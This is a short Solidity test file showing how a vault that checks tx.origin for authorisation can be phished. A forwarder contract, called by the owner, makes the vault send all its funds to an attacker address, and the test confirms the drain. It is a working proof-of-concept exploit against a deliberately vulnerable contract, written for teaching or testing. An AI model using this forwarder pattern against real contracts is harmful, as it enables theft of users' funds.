// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { VulnerableVault } from "../src/VulnerableVault.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function prank(address msgSender) external;
    function prank(address msgSender, address txOrigin) external;
}

contract PhishingForwarder {
    VulnerableVault private immutable vault;
    address payable private immutable attacker;

    constructor(VulnerableVault vault_, address payable attacker_) {
        vault = vault_;
        attacker = attacker_;
    }

    function trickOwner() external {
        vault.withdrawAll(attacker);
    }
}

contract VulnerableVaultTest {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    address internal owner = address(0xA11CE);
    address payable internal attacker = payable(address(0xB0B));

    function testTxOriginAuthCanBePhished() public {
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        VulnerableVault vault = new VulnerableVault{ value: 1 ether }();
        PhishingForwarder forwarder = new PhishingForwarder(vault, attacker);

        vm.prank(owner, owner);
        forwarder.trickOwner();

        require(address(vault).balance == 0, "vault still funded");
        require(attacker.balance == 1 ether, "attacker not paid");
    }
}
